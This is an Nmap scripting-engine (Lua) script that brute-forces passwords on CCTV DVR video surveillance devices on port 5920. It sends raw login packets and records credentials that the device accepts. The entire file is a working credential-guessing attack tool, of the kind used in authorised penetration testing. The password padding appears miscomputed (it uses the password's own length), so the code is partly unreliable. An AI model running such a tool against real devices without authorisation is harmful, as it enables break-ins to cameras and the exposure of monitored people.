local brute = require "brute"
local creds = require "creds"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
  This script tries to brute force passwords passwords for CCTV DVR
  video surveillance devices.
]]

---
-- @usage nmap --script cctv-dvr-brute <target>
--
-- @output
--
-- @xmloutput
--
-- Add Support for default password file. https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/multi_vendor_cctv_dvr_pass.txt
-- Add Support for default user file. https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/multi_vendor_cctv_dvr_user.txt

author = "Gyanendra Mishra"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"brute", "intrusive", "vuln"}

portrule = shortport.port_or_service("5920")

Driver = {
  new = function(self, host, port)
    local o = {}
    setmetatable(o, self)
    self.__index = self
    o.host = host
    o.port = port
    return o
  end,

  connect = function( self )
    self.socket = nmap.new_socket()
    return self.socket:connect( self.host, self.port )
  end,

  disconnect = function( self )
    return self.socket:close()
  end,

  check = function( self )
    return true
  end,

  login = function( self, username, password )

    local fill_length_1 = 64 - username:len()

    if fill_length_1 < 1 then return false end
    local data = "\x00\x01\x00\x00\x80\x00\x00\x00" ..  username .. string.rep("\x00", fill_length_1)
    local fill_length_2 = password:len()
    if fill_length_2 < 1 then return false end
    data = data .. password .. string.rep("\x00", fill_length_2)

    local status, err

    status, err = self.socket:send(data)
    status, data = self.socket:receive_bytes(1)

    if ( data:match("\x00\x01\x05\x01\x00\x00\x00\x00") or data:match("\x00\x01\x01\x01\x00\x00\x00\x00") ) then
      return true, creds.Account:new(username, password, creds.State.VALID)
    end
    return false, brute.Error:new( "login failed" )
  end,
}

action = function(host, port)
  local engine = brute.Engine:new(Driver, host, port)
  engine.options.script_name = SCRIPT_NAME
  local status, result = engine:start()
  return result
end
